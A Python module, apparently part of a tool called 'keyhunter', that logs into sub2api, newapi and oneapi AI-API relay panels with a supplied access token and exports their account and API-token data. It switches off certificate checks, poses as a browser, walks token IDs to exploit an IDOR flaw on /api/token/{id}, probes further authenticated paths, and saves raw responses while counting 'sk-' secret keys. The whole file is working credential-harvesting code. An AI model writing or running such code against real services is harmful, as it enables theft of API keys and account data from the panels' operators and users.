from __future__ import annotations

from pathlib import Path
from typing import Any

import httpx

from keyhunter.config import BROWSER_USER_AGENT, Settings
from keyhunter.products import ProductProfile
from keyhunter.util import safe_filename, sha256_text, write_json


def _client(settings: Settings) -> httpx.Client:
    return httpx.Client(
        timeout=settings.timeout,
        proxy=settings.proxy,
        follow_redirects=True,
        verify=False,
        headers={"User-Agent": BROWSER_USER_AGENT},
    )


def _auth_headers(
    access_token: str, product: ProductProfile, user_id: str | None
) -> dict[str, str]:
    headers = {"Authorization": f"Bearer {access_token}"}
    if product.auth_header_user_id and user_id:
        headers["New-API-User"] = str(user_id)
    return headers


def export_sub2api_accounts(
    origin: str,
    access_token: str,
    settings: Settings,
    *,
    platform: str = "openai",
    account_type: str = "oauth",
    include_proxies: bool = False,
    out_dir: Path,
) -> dict[str, Any]:
    origin = origin.rstrip("/")
    params = {
        "platform": platform,
        "type": account_type,
        "include_proxies": "true" if include_proxies else "false",
    }
    url = f"{origin}/api/v1/admin/accounts/data"
    with _client(settings) as client:
        resp = client.get(
            url,
            params=params,
            headers={"Authorization": f"Bearer {access_token}"},
        )
        status = resp.status_code
        try:
            payload = resp.json()
        except ValueError:
            payload = {"raw": resp.text[:2000]}

    host_key = safe_filename(origin.replace("://", "_").replace("/", "_"))
    raw_path = out_dir / "raw" / f"{host_key}.json"
    write_json(raw_path, payload)

    accounts: list[Any] | None = None
    if isinstance(payload, dict):
        body = payload.get("data") if isinstance(payload.get("data"), dict) else payload
        if isinstance(body, dict) and isinstance(body.get("accounts"), list):
            accounts = body["accounts"]

    result = {
        "origin": origin,
        "product": "sub2api",
        "ok": status < 400 and accounts is not None,
        "status": status,
        "account_count": len(accounts) if accounts is not None else 0,
        "raw_path": str(raw_path),
        "token_fp": sha256_text(access_token)[:16],
    }
    if status < 400 and accounts is None:
        result["reason"] = "unexpected_schema"
    return result


def _collect_token_items(payload: Any) -> list[Any]:
    items: list[Any] = []
    if isinstance(payload, dict):
        data = payload.get("data")
        if isinstance(data, list):
            items = data
        elif isinstance(data, dict):
            if isinstance(data.get("items"), list):
                items = data["items"]
            elif isinstance(data.get("data"), list):
                items = data["data"]
    return items


def export_newapi_family(
    origin: str,
    access_token: str,
    product: ProductProfile,
    settings: Settings,
    out_dir: Path,
    user_id: str | None = None,
) -> dict[str, Any]:
    """Export token list + optional IDOR /api/token/{id} for newapi/oneapi."""
    origin = origin.rstrip("/")
    headers = _auth_headers(access_token, product, user_id)
    bundle: dict[str, Any] = {"list": None, "idor": {}, "post_auth": {}}
    status = None
    with _client(settings) as client:
        list_url = f"{origin}{product.export_path}"
        resp = client.get(list_url, headers=headers)
        status = resp.status_code
        try:
            list_payload = resp.json()
        except ValueError:
            list_payload = {"raw": resp.text[:2000]}
        bundle["list"] = list_payload

        for path in product.post_auth_paths:
            if path == product.export_path:
                continue
            try:
                r = client.get(f"{origin}{path}", headers=headers)
                try:
                    bundle["post_auth"][path] = r.json()
                except ValueError:
                    bundle["post_auth"][path] = {
                        "status": r.status_code,
                        "raw": r.text[:1000],
                    }
            except httpx.HTTPError as exc:
                bundle["post_auth"][path] = {"error": type(exc).__name__}

        if product.idor_path:
            # Prefer IDs discovered in list; else probe 1..idor_max
            ids: list[int] = []
            for item in _collect_token_items(list_payload):
                if isinstance(item, dict) and item.get("id") is not None:
                    try:
                        ids.append(int(item["id"]))
                    except (TypeError, ValueError):
                        pass
            if not ids:
                ids = list(range(1, product.idor_max + 1))
            else:
                ids = sorted(set(ids))[: product.idor_max]
            for token_id in ids:
                path = product.idor_path.replace("{id}", str(token_id))
                try:
                    r = client.get(f"{origin}{path}", headers=headers)
                    if r.status_code >= 400:
                        continue
                    try:
                        bundle["idor"][str(token_id)] = r.json()
                    except ValueError:
                        bundle["idor"][str(token_id)] = {"raw": r.text[:1000]}
                except httpx.HTTPError:
                    continue

    host_key = safe_filename(origin.replace("://", "_").replace("/", "_"))
    raw_path = out_dir / "raw" / f"{host_key}.json"
    write_json(raw_path, bundle)
    items = _collect_token_items(bundle.get("list"))
    sk_hits = 0
    blob = str(bundle)
    # crude count of sk- material for summary only
    sk_hits = blob.count("sk-")
    return {
        "origin": origin,
        "product": product.id,
        "ok": bool(status is not None and status < 400),
        "status": status,
        "account_count": len(items),
        "idor_count": len(bundle.get("idor") or {}),
        "sk_mentions": sk_hits,
        "raw_path": str(raw_path),
        "token_fp": sha256_text(access_token)[:16],
    }


def export_session(
    session: dict[str, Any],
    product: ProductProfile,
    settings: Settings,
    out_dir: Path,
) -> dict[str, Any]:
    if not session.get("ok") or not session.get("access_token"):
        return {
            "origin": session.get("origin"),
            "product": product.id,
            "ok": False,
            "reason": "no_session",
        }
    if product.id == "sub2api":
        return export_sub2api_accounts(
            session["origin"], session["access_token"], settings, out_dir=out_dir
        )
    if product.id in {"newapi", "oneapi"}:
        return export_newapi_family(
            session["origin"],
            session["access_token"],
            product,
            settings,
            out_dir,
            user_id=session.get("user_id"),
        )
    return {"ok": False, "reason": f"unsupported_product:{product.id}"}
